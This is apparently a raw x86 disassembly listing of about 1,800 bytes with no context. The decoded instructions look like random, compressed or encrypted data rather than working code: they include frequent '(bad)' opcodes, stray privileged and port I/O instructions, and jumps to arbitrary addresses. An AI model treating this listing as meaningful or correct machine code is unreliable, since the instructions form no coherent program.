  421d54:	pop    esp
  421d55:	fwait
  421d56:	leave  
  421d57:	imul   ecx,DWORD PTR [ecx-0x2751c4fb],0x5e4ad442
  421d61:	out    dx,al
  421d62:	enter  0xa424,0x8
  421d66:	stos   DWORD PTR es:[edi],eax
  421d67:	idiv   DWORD PTR [ecx-0x49]
  421d6a:	imul   DWORD PTR [ebx]
  421d6c:	nop
  421d6d:	pop    ebx
  421d6e:	lea    edi,[eax]
  421d70:	dec    ebp
  421d71:	jb     0x421d6a
  421d73:	sub    ebx,esi
  421d75:	ja     0x421d98
  421d77:	pop    es
  421d78:	inc    ebp
  421d79:	ja     0x421d11
  421d7b:	sbb    edx,eax
  421d7d:	mov    esi,0xb4c81b71
  421d82:	inc    edx
  421d83:	add    BYTE PTR [esi+0x54],cl
  421d86:	aad    0xa6
  421d88:	sub    BYTE PTR ds:0xf992639b,0x9a
  421d8f:	ins    BYTE PTR es:[edi],dx
  421d90:	mov    DWORD PTR [ecx+0x8a34229],esi
  421d96:	in     al,dx
  421d97:	xor    DWORD PTR [edi+0x74c9ffd8],eax
  421d9d:	pop    ecx
  421d9e:	jae    0x421d84
  421da0:	(bad)  
  421da1:	jl     0x421da8
  421da3:	add    ch,bh
  421da5:	aad    0x50
  421da7:	xor    eax,0x18d6b300
  421dac:	int3   
  421dad:	in     eax,dx
  421dae:	lahf   
  421daf:	sbb    eax,0xf0bae068
  421db4:	bound  esp,QWORD PTR [ebp+0x64656ca2]
  421dba:	dec    edi
  421dbb:	push   0x65b27c7f
  421dc0:	icebp  
  421dc1:	adc    DWORD PTR [ecx],edi
  421dc3:	mov    bl,cl
  421dc5:	jae    0x421d82
  421dc7:	test   DWORD PTR [edx-0x2f844947],0xc57fa602
  421dd1:	xchg   esp,eax
  421dd2:	xor    al,0xc4
  421dd4:	dec    edx
  421dd5:	dec    edi
  421dd6:	dec    ecx
  421dd7:	or     al,0xb
  421dd9:	xor    eax,0x4364c55f
  421dde:	mov    ebx,ebx
  421de0:	cld    
  421de1:	push   ecx
  421de2:	add    eax,0x47e3c60b
  421de7:	sub    DWORD PTR [ebx+ebp*1-0x4e],esi
  421deb:	add    al,0xe1
  421ded:	or     DWORD PTR [ecx-0x27],esp
  421df0:	cld    
  421df1:	stos   BYTE PTR es:[edi],al
  421df2:	je     0x421e52
  421df4:	sti    
  421df5:	sbb    ebp,esi
  421df7:	push   ss
  421df8:	xlat   BYTE PTR ds:[ebx]
  421df9:	addr16 push eax
  421dfb:	and    BYTE PTR [eax],cl
  421dfd:	ins    DWORD PTR es:[edi],dx
  421dfe:	dec    edx
  421dff:	jmp    0x421e6a
  421e01:	mov    eax,ds:0x66d289b7
  421e06:	ret    
  421e07:	xor    BYTE PTR [esi-0x7d],al
  421e0a:	mov    dh,BYTE PTR [edi-0x5]
  421e0d:	cmp    dl,BYTE PTR [esi]
  421e0f:	mov    ch,0xc7
  421e11:	mov    ecx,0xcdb77f64
  421e16:	add    ch,bl
  421e18:	xchg   ebx,eax
  421e19:	mov    dl,0x62
  421e1b:	push   0x484736c3
  421e20:	call   0x2d98cb4
  421e25:	dec    eax
  421e26:	lahf   
  421e27:	sub    DWORD PTR [ebx],ecx
  421e29:	and    BYTE PTR [eax-0x10],ch
  421e2c:	xchg   esp,eax
  421e2d:	loop   0x421e53
  421e2f:	bound  ebx,QWORD PTR [esi-0x8278b7d]
  421e35:	loope  0x421e50
  421e37:	push   ebp
  421e38:	nop
  421e39:	adc    BYTE PTR [esi],dh
  421e3b:	xor    BYTE PTR [eax-0xa],dl
  421e3e:	repz sbb eax,0xc60342e9
  421e44:	xor    eax,0xffffff8b
  421e47:	repnz ficom WORD PTR [esi-0x1c]
  421e4b:	adc    eax,0x7a55033e
  421e50:	ss ins BYTE PTR es:[edi],dx
  421e52:	jle    0x421ea3
  421e54:	pop    esi
  421e55:	pop    esi
  421e56:	adc    al,BYTE PTR [esi+0x53]
  421e59:	addr16 and ch,0x85
  421e5d:	ins    BYTE PTR es:[edi],dx
  421e5e:	in     eax,0x2d
  421e60:	fist   WORD PTR [edi+0x73]
  421e63:	mov    eax,0x19549862
  421e68:	lock cmp ebp,DWORD PTR [bx-0x25]
  421e6d:	jns    0x421df1
  421e6f:	out    0xd3,al
  421e71:	or     ecx,ecx
  421e73:	into   
  421e74:	jns    0x421e78
  421e76:	xor    eax,0x1ffdc2c4
  421e7b:	jo     0x421ef8
  421e7d:	(bad)  
  421e7e:	int3   
  421e7f:	dec    ebx
  421e80:	ja     0x421e46
  421e82:	mov    ah,0xd2
  421e84:	mov    ds:0x9eed8691,al
  421e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e8a:	mov    eax,DWORD PTR [ecx]
  421e8c:	sbb    ch,0x18
  421e8f:	sub    eax,0x77dc4411
  421e94:	inc    ch
  421e96:	ds push ds
  421e98:	or     DWORD PTR [eax+0x76],ecx
  421e9b:	mov    esp,0x56cbc318
  421ea0:	xchg   edi,eax
  421ea1:	int3   
  421ea2:	out    0xe4,eax
  421ea4:	jle    0x421e42
  421ea6:	fild   WORD PTR [edx+0x1c]
  421ea9:	xchg   esp,eax
  421eaa:	sub    ebx,DWORD PTR [edi+0x73fa14ad]
  421eb0:	mov    ah,0xfd
  421eb2:	jmp    esp
  421eb4:	mov    ebx,0x4a81f4d0
  421eb9:	adc    DWORD PTR [esi],ecx
  421ebb:	sub    eax,0xcf134d8f
  421ec0:	sub    ebx,DWORD PTR [edi*4-0x90ba293]
  421ec7:	iret   
  421ec8:	(bad)  
  421ec9:	cli    
  421eca:	stos   BYTE PTR es:[edi],al
  421ecb:	imul   esp,DWORD PTR [ecx+0x7533b6d8],0xffffffd2
  421ed2:	dec    edi
  421ed3:	sub    al,0x3c
  421ed5:	jo     0x421ef9
  421ed7:	or     eax,0x2233a621
  421edc:	add    eax,0xccbd7ec1
  421ee1:	jecxz  0x421ea8
  421ee3:	dec    eax
  421ee4:	test   eax,0xda087ea1
  421ee9:	sbb    bl,BYTE PTR [ebx+0x29]
  421eec:	cmp    DWORD PTR [edx-0x161efc39],esi
  421ef2:	sbb    DWORD PTR [ebp-0x199a1547],edx
  421ef8:	and    DWORD PTR [ebp+ebp*4-0x18d1075d],ebx
  421eff:	pushf  
  421f00:	call   0xbb6afff0
  421f05:	inc    esp
  421f06:	sub    bl,BYTE PTR [edx-0x48]
  421f09:	dec    eax
  421f0a:	xchg   ebp,eax
  421f0b:	pop    esp
  421f0c:	fs and esi,edi
  421f0f:	out    dx,al
  421f10:	test   eax,0xb3ca2401
  421f15:	das    
  421f16:	cmp    DWORD PTR [ebx+edx*8],ecx
  421f19:	pop    eax
  421f1a:	ins    DWORD PTR es:[edi],dx
  421f1b:	push   ds
  421f1c:	inc    ebp
  421f1d:	in     al,dx
  421f1e:	cmc    
  421f1f:	push   ecx
  421f20:	shl    DWORD PTR [ecx+eiz*1],cl
  421f23:	adc    BYTE PTR [esi],0x27
  421f26:	inc    esi
  421f27:	adc    ebp,esp
  421f29:	sub    edx,DWORD PTR [ebx+0xa]
  421f2c:	ror    bh,1
  421f2e:	sbb    bh,ch
  421f30:	sbb    al,dl
  421f32:	pop    ss
  421f33:	nop
  421f34:	daa    
  421f35:	and    eax,DWORD PTR [edi]
  421f37:	push   edx
  421f38:	push   ebp
  421f39:	fldenv [esi+0xf914ea9]
  421f3f:	(bad)  
  421f40:	jge    0x421f0d
  421f42:	sub    al,0x1b
  421f44:	mov    bh,0x9d
  421f46:	mov    DWORD PTR [ecx+esi*8+0x5c],ebp
  421f4a:	mov    bl,0xf6
  421f4c:	add    eax,0xe9918dbf
  421f51:	ss leave 
  421f53:	aaa    
  421f54:	enter  0xe6b5,0x29
  421f58:	gs in  eax,0x2a
  421f5b:	mov    ebp,0xf1470268
  421f60:	mov    ebp,0x7756d19e
  421f65:	shr    BYTE PTR [ebx+0x30],cl
  421f68:	xor    BYTE PTR [esi-0x5b],dh
  421f6b:	mov    ebp,0xff447dd1
  421f70:	or     eax,0xdd766a1c
  421f75:	mov    ?,ebx
  421f77:	dec    esi
  421f78:	shr    bh,1
  421f7a:	jb     0x421fc4
  421f7c:	fwait
  421f7d:	xchg   edx,eax
  421f7e:	pop    edx
  421f7f:	repnz mov esp,0x89d90217
  421f85:	xlat   BYTE PTR ds:[ebx]
  421f86:	cli    
  421f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f88:	add    al,0x35
  421f8a:	mov    edi,0xf72ccbae
  421f8f:	xor    DWORD PTR [ebx],0x7
  421f92:	imul   ebx,DWORD PTR [edi+0x5430dd8e],0x399c0e91
  421f9c:	ror    dl,cl
  421f9e:	jns    0x421ff0
  421fa0:	(bad)  
  421fa1:	call   0x268be9c1
  421fa6:	push   ebp
  421fa7:	cwde   
  421fa8:	(bad)  
  421fa9:	sbb    ebp,esp
  421fab:	bound  eax,QWORD PTR [esi]
  421fad:	test   al,0xdf
  421faf:	cmp    eax,0x9065d564
  421fb4:	fsqrt  
  421fb6:	xchg   ebx,eax
  421fb7:	ror    DWORD PTR [edi+0x7f],0xc6
  421fbb:	addr16 dec edi
  421fbd:	and    BYTE PTR [ecx+0x1c],dh
  421fc0:	add    ebp,DWORD PTR [eax]
  421fc2:	into   
  421fc3:	xchg   edx,eax
  421fc4:	jle    0x421f56
  421fc6:	dec    edx
  421fc7:	xchg   ecx,eax
  421fc8:	sub    BYTE PTR [ebp-0x1b],ah
  421fcb:	nop
  421fcc:	imul   ebx,ebp,0x58
  421fcf:	lock jns 0x421fb8
  421fd2:	and    DWORD PTR [edx-0x7bab9a9f],eax
  421fd8:	inc    edx
  421fd9:	pop    eax
  421fda:	xor    bh,BYTE PTR [edi+eiz*1]
  421fdd:	ss cld 
  421fdf:	or     ecx,DWORD PTR [ebx-0x77]
  421fe2:	clc    
  421fe3:	add    al,0xcb
  421fe5:	mov    al,ds:0x3f86beca
  421fea:	in     eax,dx
  421feb:	inc    esp
  421fec:	push   cs
  421fed:	jb     0x42204b
  421fef:	mov    DWORD PTR [eax+0x28],edi
  421ff2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff3:	(bad)  
  421ff4:	stc    
  421ff5:	in     eax,0x7a
  421ff7:	dec    ebp
  421ff8:	arpl   WORD PTR [edx+0x3e],dx
  421ffb:	jecxz  0x421f7e
  421ffd:	stos   BYTE PTR es:[edi],al
  421ffe:	shl    edi,cl
  422000:	dec    ecx
  422001:	scas   eax,DWORD PTR es:[edi]
  422002:	fdivr  DWORD PTR [eax]
  422004:	push   ecx
  422005:	fistp  WORD PTR [ecx-0xce353f3]
  42200b:	pop    esp
  42200c:	jle    0x422078
  42200e:	popa   
  42200f:	push   edx
  422010:	test   al,0xc5
  422012:	mov    edi,edx
  422014:	xor    dh,bl
  422016:	mov    edx,0x5762aeb2
  42201b:	outs   dx,DWORD PTR ds:[esi]
  42201c:	mov    ecx,0xe894bec0
  422021:	sti    
  422022:	adc    dh,BYTE PTR [ebp+edx*1-0x434f88af]
  422029:	(bad)  
  42202a:	jmp    0xb7f9:0x96b6371d
  422031:	test   DWORD PTR [ebp-0x6b],0xaaae5c0d
  422038:	mov    ebx,0x2096fd93
  42203d:	aam    0x69
  42203f:	mov    DWORD PTR [eax-0x3bf56eb0],edx
  422045:	mov    dl,0x2b
  422047:	fcmovne st,st(4)
  422049:	popf   
  42204a:	lods   al,BYTE PTR ds:[esi]
  42204b:	pminsw mm2,mm4
  42204e:	cli    
  42204f:	push   eax
  422050:	dec    ecx
  422051:	push   ss
  422052:	adc    ch,al
  422054:	xlat   BYTE PTR ds:[ebx]
  422055:	aad    0x2a
  422057:	jecxz  0x42209c
  422059:	xor    edi,DWORD PTR [edx+0xb11a362]
  42205f:	ja     0x42209a
  422061:	xchg   esi,eax
  422062:	in     al,0xfc
  422064:	xchg   ebp,eax
  422065:	fistp  QWORD PTR [ecx-0xee03af3]
  42206b:	add    eax,0xa48e7e18
  422070:	mov    al,ds:0xdfb007f6
  422075:	loop   0x422066
  422077:	push   edi
  422078:	ja     0x4220cf
  42207a:	jo     0x42208b
  42207c:	lods   eax,DWORD PTR ds:[esi]
  42207d:	lahf   
  42207e:	pop    esp
  42207f:	add    DWORD PTR [esi],ecx
  422081:	jmp    0xf6cc7d45
  422086:	(bad)  
  422087:	pop    ebx
  422088:	addr16 and al,0x41
  42208b:	or     al,0x51
  42208d:	add    edi,DWORD PTR [edx+0x4cf31f44]
  422093:	dec    edx
  422094:	loop   0x422111
  422096:	adc    ebx,DWORD PTR [edx+0x59]
  422099:	(bad)  [edi+0x2ab81e74]
  42209f:	outs   dx,BYTE PTR ds:[esi]
  4220a0:	cmp    eax,DWORD PTR [ecx+0x60]
  4220a3:	push   ecx
  4220a4:	mov    ds:0xe3e3d023,eax
  4220a9:	and    edi,esi
  4220ab:	jnp    0x42203d
  4220ad:	xor    ah,cl
  4220af:	mov    ds:0xc41a32ed,eax
  4220b4:	mov    esi,DWORD PTR [ebp-0x5c]
  4220b7:	sbb    al,0xd5
  4220b9:	push   0x52
  4220bb:	(bad)  
  4220bd:	dec    ebx
  4220be:	sub    ecx,eax
  4220c0:	dec    ecx
  4220c1:	lahf   
  4220c2:	xchg   esi,eax
  4220c3:	sbb    BYTE PTR [eax],bl
  4220c5:	call   DWORD PTR [ebx+eax*8]
  4220c8:	inc    esi
  4220c9:	jno    0x42204c
  4220cb:	and    ebx,DWORD PTR [edx+edi*1]
  4220ce:	dec    eax
  4220cf:	jle    0x4220ea
  4220d1:	dec    edi
  4220d2:	xor    al,0x81
  4220d4:	in     eax,dx
  4220d5:	loope  0x42211b
  4220d7:	adc    eax,0x2a343448
  4220dc:	cmp    dl,bl
  4220de:	add    ebx,DWORD PTR [ecx-0x2eeb248b]
  4220e4:	mov    ch,0x6c
  4220e6:	add    eax,DWORD PTR [edx+0x8d48a20]
  4220ec:	fmul   QWORD PTR [edx-0x22]
  4220ef:	(bad)  
  4220f0:	cmp    DWORD PTR [edx-0x4f3978ff],esp
  4220f6:	call   0x35e2:0x40f2e41f
  4220fd:	adc    BYTE PTR [edi-0x29688373],bl
  422103:	mov    eax,ds:0x7a8be137
  422108:	js     0x42210d
  42210a:	repz es dec di
  42210e:	outs   dx,BYTE PTR ds:[esi]
  42210f:	adc    al,0x75
  422111:	xlat   BYTE PTR ds:[ebx]
  422112:	mov    bh,0x8
  422114:	idiv   DWORD PTR [ecx+0x18]
  422117:	push   0x37668282
  42211c:	sub    esi,DWORD PTR [ecx-0x36068fa8]
  422122:	xor    DWORD PTR [eiz*2-0x7b47aeb9],edi
  422129:	out    0xc8,al
  42212b:	or     BYTE PTR [edi-0x4ae959a7],ah
  422131:	mov    WORD PTR [ecx-0x3cce692],es
  422137:	pop    es
  422138:	cdq    
  422139:	adc    al,0x59
  42213b:	xchg   DWORD PTR [eax],esp
  42213d:	ret    
  42213e:	lods   eax,DWORD PTR ds:[esi]
  42213f:	xchg   ebp,eax
  422140:	cmp    eax,0x7029c0da
  422145:	rol    DWORD PTR [bx+di-0x21d6],cl
  42214a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42214b:	mov    al,ds:0x403f696a
  422150:	inc    eax
  422151:	push   edi
  422152:	into   
  422153:	test   bh,0xd9
  422156:	and    edi,DWORD PTR [ebx*4-0x7b95a676]
  42215d:	jmp    0x2867e4d8
  422162:	xor    ch,bl
  422164:	lock aaa 
  422166:	push   ebp
  422167:	rol    BYTE PTR [ebx-0x69316422],cl
  42216d:	fs js  0x4221ad
  422170:	das    
  422171:	jne    0x4221d6
  422173:	or     eax,0xd1ce698c
  422178:	and    ebp,DWORD PTR [ebx]
  42217a:	fdivr  DWORD PTR [eax-0x1b]
  42217d:	dec    esi
  42217e:	bound  ebx,QWORD PTR ds:0xdddec24a
  422184:	arpl   dx,di
  422186:	jb     0x422174
  422188:	in     al,0xa6
  42218a:	aam    0xf0
  42218c:	vmread edx,esp
  42218f:	push   edi
  422190:	std    
  422191:	rcr    cl,1
  422193:	xchg   edx,eax
  422194:	xchg   edi,eax
  422195:	mov    cl,0x9a
  422197:	inc    edi
  422198:	stos   BYTE PTR es:[edi],al
  422199:	(bad)  
  42219a:	xor    al,0x24
  42219c:	push   ds
  42219d:	and    BYTE PTR [ecx+0x40],0x2b
  4221a1:	xchg   DWORD PTR [ecx+0x71ba9578],esi
  4221a7:	fidivr WORD PTR [ebx+0x56]
  4221aa:	jmp    0x422193
  4221ac:	xchg   edx,eax
  4221ad:	pusha  
  4221ae:	cli    
  4221af:	push   ebp
  4221b0:	mov    DWORD PTR [esi+ebp*2],edi
  4221b3:	shl    DWORD PTR [eax+0x5e1d4264],cl
  4221b9:	sti    
  4221ba:	dec    ecx
  4221bb:	add    edi,DWORD PTR [edx-0x79]
  4221be:	cmp    esp,DWORD PTR [eax]
  4221c0:	fmul   DWORD PTR [esp+eiz*4-0x6c0f1956]
  4221c7:	cmc    
  4221c8:	fwait
  4221c9:	xor    ah,BYTE PTR [edi-0x6a]
  4221cc:	ror    BYTE PTR [edx-0x2c],0xb7
  4221d0:	inc    edi
  4221d1:	scas   al,BYTE PTR es:[edi]
  4221d2:	cld    
  4221d3:	out    dx,eax
  4221d4:	ja     0x422173
  4221d6:	test   al,0x95
  4221d8:	pusha  
  4221d9:	ficom  WORD PTR [ebp-0x1f]
  4221dc:	jnp    0x4221a9
  4221de:	xchg   ebx,eax
  4221df:	ds addr16 call 0x5a805d01
  4221e6:	and    DWORD PTR [esi-0x1ca1e4e1],0x24
  4221ed:	mov    eax,DWORD PTR [edi-0x46fdd2a2]
  4221f3:	lahf   
  4221f4:	mov    al,ds:0x70fe6342
  4221f9:	mov    al,ds:0x6f511736
  4221fe:	mov    ecx,0x585af77
  422203:	lock cmc 
  422205:	mov    dh,0x82
  422207:	sub    esp,ecx
  422209:	in     eax,dx
  42220a:	or     esi,ebp
  42220c:	inc    esi
  42220d:	shrd   DWORD PTR [ecx],eax,cl
  422210:	rol    BYTE PTR [edx+0xf],0x85
  422214:	jbe    0x422211
  422216:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  422218:	pop    ss
  422219:	rcl    DWORD PTR [ecx+edi*4+0xb],1
  42221d:	popa   
  42221e:	mov    esi,0xbb6c99b9
  422223:	aam    0x9a
  422225:	jmp    0x422226
  422227:	adc    eax,0x1aa4a1b9
  42222c:	stos   DWORD PTR es:[edi],eax
  42222d:	cld    
  42222e:	jecxz  0x4221cc
  422230:	inc    DWORD PTR [ebx-0x3]
  422233:	fmul   st,st(4)
  422235:	aam    0x47
  422237:	sub    al,0x58
  422239:	addr16 (bad) 
  42223b:	(bad)  [eax-0x3810c46e]
  422241:	rcr    BYTE PTR [eax],0x32
  422244:	inc    eax
  422245:	mov    dh,0x1
  422247:	inc    edx
  422248:	mov    WORD PTR [edx-0x47],cs
  42224b:	jbe    0x422229
  42224d:	fstp   TBYTE PTR [edi]
  42224f:	adc    BYTE PTR [esi],al
  422251:	mov    al,ds:0xf8da89d7
  422256:	xor    BYTE PTR [eax-0x6],bl
  422259:	push   edi
  42225a:	(bad)
  42225d:	das    
  42225e:	std    
  42225f:	out    dx,eax
  422260:	cmp    al,0x8c
  422262:	jns    0x4222dc
  422264:	mov    bl,BYTE PTR [ecx-0x34]
  422267:	out    dx,al
  422268:	dec    ecx
  422269:	and    DWORD PTR [eax+0x6d],ebp
  42226c:	mov    DWORD PTR [edi],esi
  42226e:	xor    eax,0xc903dce2
  422273:	iret   
  422274:	pop    ebp
  422275:	jle    0x4222c1
  422277:	sub    bh,BYTE PTR [ebp-0x2c]
  42227a:	popa   
  42227b:	js     0x4222ab
  42227d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42227e:	and    WORD PTR [edi+edi*8-0x39],bp
  422283:	pushf  
  422284:	jo     0x42222f
  422286:	lods   eax,DWORD PTR ds:[esi]
  422287:	test   cl,0x36
  42228a:	adc    al,0x1
  42228c:	inc    ebx
  42228d:	cmp    esp,edi
  42228f:	(bad)  
  422290:	dec    edi
  422291:	push   ebp
  422292:	pop    ebp
  422293:	dec    ecx
  422294:	pop    edx
  422295:	retf   
  422296:	cmc    
  422297:	ins    BYTE PTR es:[edi],dx
  422298:	call   0x3e791761
  42229d:	rol    DWORD PTR [edi],1
  42229f:	repz jmp 0x5d51fde
  4222a5:	shl    BYTE PTR [edi],0x72
  4222a8:	xchg   ebx,eax
  4222a9:	jns    0x4222a3
  4222ab:	pop    ecx
  4222ac:	mov    bh,0xe9
  4222ae:	std    
  4222af:	cs repz push 0x8dc15f68
  4222b6:	or     DWORD PTR [edx+0x51a1478f],ebx
  4222bc:	les    ebp,FWORD PTR [esi]
  4222be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222bf:	mov    ch,BYTE PTR [ecx-0x5ba95eef]
  4222c5:	mov    WORD PTR [eax],?
  4222c7:	retf   0xddad
  4222ca:	add    BYTE PTR [ecx],dl
  4222cc:	sub    dl,BYTE PTR [eax+edi*4]
  4222cf:	shl    edi,cl
  4222d1:	pop    es
  4222d2:	fsubr  DWORD PTR [edi+0x59]
  4222d5:	std    
  4222d6:	mov    DWORD PTR [edx+0x239d55df],eax
  4222dc:	lods   eax,DWORD PTR ds:[esi]
  4222dd:	cmp    DWORD PTR [eax],ebp
  4222df:	mov    BYTE PTR [ebx-0x3d732003],bl
  4222e5:	fsubr  DWORD PTR [esi-0x1c]
  4222e8:	(bad)  
  4222ea:	mov    cl,BYTE PTR [eax]
  4222ec:	jns    0x422321
  4222ee:	fwait
  4222ef:	cmc    
  4222f0:	push   es
  4222f1:	and    BYTE PTR [ecx],ah
  4222f3:	dec    edx
  4222f4:	jp     0x4222df
  4222f6:	mov    al,0xfc
  4222f8:	test   al,0xa7
  4222fa:	push   ss
  4222fb:	sbb    DWORD PTR [eax+0x6131b39d],esp
  422301:	in     al,dx
  422302:	sbb    ecx,DWORD PTR [esi]
  422304:	jg     0x4222e7
  422306:	inc    eax
  422307:	sub    al,0x74
  422309:	and    DWORD PTR [ebx],ebx
  42230b:	mov    ah,0xeb
  42230d:	ja     0x4222a7
  42230f:	clc    
  422310:	cmp    DWORD PTR ds:0x29c28cef,0x7f
  422317:	mov    BYTE PTR [ebx+0x35],ch
  42231a:	sub    edi,DWORD PTR [esi+esi*8-0x42d7f3bb]
  422321:	imul   eax,DWORD PTR [edi-0x2cec143a],0x6d31f995
  42232b:	pop    ebp
  42232c:	test   BYTE PTR [edx],0xb6
  42232f:	cmc    
  422330:	push   0x4ea33495
  422335:	or     ah,bl
  422337:	scas   eax,DWORD PTR es:[edi]
  422338:	(bad)  
  422339:	repz sbb BYTE PTR [edi-0xd48c374],bl
  422340:	outs   dx,BYTE PTR ds:[esi]
  422341:	push   esp
  422342:	lock das 
  422344:	and    BYTE PTR [ecx+0x43223c7],ch
  42234a:	add    esp,DWORD PTR [esi+0x26e2da43]
  422350:	jae    0x422363
  422352:	mov    edi,0x92414591
  422357:	or     BYTE PTR [edi+0x66],al
  42235a:	out    0x5b,al
  42235c:	fst    DWORD PTR [esi]
  42235e:	push   0x16
  422360:	sub    esp,esp
  422362:	aas    
  422363:	outs   dx,DWORD PTR ds:[esi]
  422364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422365:	fidiv  DWORD PTR [edi]
  422367:	jmp    0xcc02f195
  42236c:	rdpmc  
  42236e:	in     al,dx
  42236f:	cmova  esp,esi
  422372:	mov    esp,0x5555408e
  422377:	mov    WORD PTR [ecx+0x6ae0c5c2],fs
  42237d:	sar    ah,cl
  42237f:	mov    edx,0xbdfb9770
  422384:	fsubr  DWORD PTR [ecx+ecx*1]
  422387:	or     BYTE PTR [esi-0x1e],bh
  42238a:	rcr    BYTE PTR [edx],0xdc
  42238d:	xor    ah,BYTE PTR [ebx]
  42238f:	retf   
  422390:	cmc    
  422391:	retf   0x5a57
  422394:	jg     0x4223af
  422396:	(bad)  
  422397:	(bad)  [ebx]
  422399:	cmc    
  42239a:	cld    
  42239b:	or     BYTE PTR [edx+0x17900392],0x29
  4223a2:	call   0x77b5:0x6c0ff050
  4223a9:	ficom  DWORD PTR [ebx+0xdbf3191]
  4223af:	repz sbb eax,0x18f1d52b
  4223b5:	mov    dl,0x67
  4223b7:	jecxz  0x4223c9
  4223b9:	jnp    0x42242a
  4223bb:	dec    edx
  4223bc:	mov    ds:0xc3ae5689,al
  4223c1:	inc    esp
  4223c2:	xchg   BYTE PTR [ecx-0x4d17ea34],ch
  4223c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223c9:	mov    ds,WORD PTR [eax-0x10]
  4223cc:	scas   al,BYTE PTR es:[edi]
  4223cd:	and    eax,0x732e8b54
  4223d2:	fwait
  4223d3:	neg    DWORD PTR [ecx]
  4223d5:	into   
  4223d6:	imul   BYTE PTR [esi]
  4223d8:	or     BYTE PTR [esi-0x37],bl
  4223db:	sbb    dl,BYTE PTR [edi-0x819040c]
  4223e1:	pusha  
  4223e2:	pop    ebx
  4223e3:	pushf  
  4223e4:	inc    eax
  4223e5:	mov    ah,BYTE PTR [eax-0x50]
  4223e8:	or     BYTE PTR [ecx-0x11],bh
  4223eb:	inc    esp
  4223ec:	cmp    bl,BYTE PTR [esi+0x49497eb2]
  4223f2:	pushf  
  4223f3:	sbb    eax,0x21b8beea
  4223f8:	rcr    DWORD PTR [eax+0x3c1a87a1],0x77
  4223ff:	jb     0x4223ed
  422401:	pop    esp
  422402:	xchg   esi,eax
  422403:	ins    BYTE PTR es:[edi],dx
  422404:	adc    ah,BYTE PTR [ebp-0x78719e2c]
  42240a:	add    eax,0x7de9d144
  42240f:	pop    ebx
  422410:	push   eax
  422411:	mov    ds,WORD PTR [eax+0x3c]
  422414:	fdivr  QWORD PTR ds:0xed0c9698
  42241a:	cwde   
  42241b:	and    al,0xe0
  42241d:	jle    0x7202a9a6
  422423:	sub    al,0xb5
  422425:	ins    DWORD PTR es:[edi],dx
  422426:	cs mov edx,0x9768dbda
  42242c:	std    
  42242d:	jmp    0x9bc6:0xc09bb820
  422434:	mov    esi,0xe22068de
  422439:	mov    WORD PTR [eax],gs
  42243b:	out    dx,al
  42243c:	call   0x1a32:0xf1437861
  422443:	leave  
  422444:	and    DWORD PTR [eax+0x40287548],esi
  42244a:	mov    esp,esp
  42244c:	cmp    al,0x19
  42244e:	jne    0x42247d
  422450:	xor    dh,ch
  422452:	cmp    al,0x74
  422454:	js     0x4224ad
  422456:	in     eax,dx
  422457:	jecxz  0x4223f7
  422459:	adc    edx,DWORD PTR [eax]
  42245b:	xchg   ebp,eax
  42245c:	inc    esp
  42245d:	jnp    0x4224b0
  42245f:	add    BYTE PTR [esp+edx*1-0x67],0x2d
  422464:	sub    ebp,ecx
  422466:	xor    DWORD PTR [edi+0x2462ee11],eax
  42246c:	or     BYTE PTR [edx+0x78],0x38
  422470:	add    dh,BYTE PTR [edi-0x2]
  422473:	mov    BYTE PTR [ecx+edx*4],ah
  422476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422477:	jne    0x4224c0
  422479:	add    DWORD PTR [esi-0x2270f637],ebp
  42247f:	les    ebx,FWORD PTR [edx+ebx*4]
  422482:	out    dx,eax
  422483:	scas   al,BYTE PTR es:[edi]
  422484:	fmul   DWORD PTR [ecx]
  422486:	enter  0xb922,0x25
  42248a:	mov    cl,0xd7
  42248c:	es add eax,0x4a416e68
  422492:	into   
  422493:	ins    BYTE PTR es:[edi],dx
  422494:	loop   0x42247d
  422496:	mov    dl,0xef
  422498:	shl    BYTE PTR [edx-0x2c],1
  42249b:	sub    DWORD PTR [eax],0xe2f9fdb0
  4224a1:	mov    ecx,0x972fdf51
  4224a6:	pop    ss
  4224a7:	cmp    eax,0xc55fd2d7
  4224ac:	sbb    dl,BYTE PTR [ebx]
  4224ae:	mov    al,gs:0x3a0c846c
  4224b4:	and    DWORD PTR [edx],0x7f
  4224b7:	mov    al,0x4
  4224b9:	mov    edi,0x39649e68
  4224be:	mov    ecx,0xfb16db2d
  4224c3:	leave  
  4224c4:	(bad)  
  4224c5:	and    DWORD PTR [esi],edi
  4224c7:	pop    ss
  4224c8:	sbb    dh,BYTE PTR [edx+0x53]
  4224cb:	jne    0x4224c2
  4224cd:	jl     0x422528
  4224cf:	cmp    dh,bl
  4224d1:	add    BYTE PTR [esi],bh
  4224d3:	or     eax,0x2fd26b51
  4224d8:	fimul  DWORD PTR [edi-0x51e206cf]
  4224de:	fwait
  4224df:	aad    0xe
  4224e1:	mov    DWORD PTR fs:[edi+0x2f],esp
  4224e5:	lea    ebx,[eax-0x66]
  4224e8:	in     eax,dx
  4224e9:	push   ecx
  4224ea:	xlat   BYTE PTR ds:[ebx]
  4224eb:	pop    esp
  4224ec:	daa    
  4224ed:	int3   
  4224ee:	inc    ebx
  4224ef:	or     al,0x87
  4224f1:	dec    esp
  4224f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f3:	loopne 0x4224d0
  4224f5:	aas    
  4224f6:	les    edx,FWORD PTR [eax-0x78fcf346]
  4224fc:	sti    
  4224fd:	inc    ebp
  4224fe:	out    0x74,al
  422500:	mov    esi,0xfe3dce0d
  422505:	idiv   DWORD PTR [edi-0xe]
  422508:	inc    esp
  422509:	push   edi
  42250a:	push   eax
  42250b:	xor    ch,ch
  42250d:	scas   eax,DWORD PTR es:[edi]
  42250e:	nop
  42250f:	and    eax,0x38ecce47
  422514:	pop    edx
  422515:	out    0x10,eax
  422517:	inc    eax
  422518:	lods   al,BYTE PTR ds:[esi]
  422519:	inc    edi
  42251a:	sub    bl,BYTE PTR [eax]
  42251c:	aaa    
  42251d:	stos   DWORD PTR es:[edi],eax
  42251e:	mov    edi,0x91dcf9b5
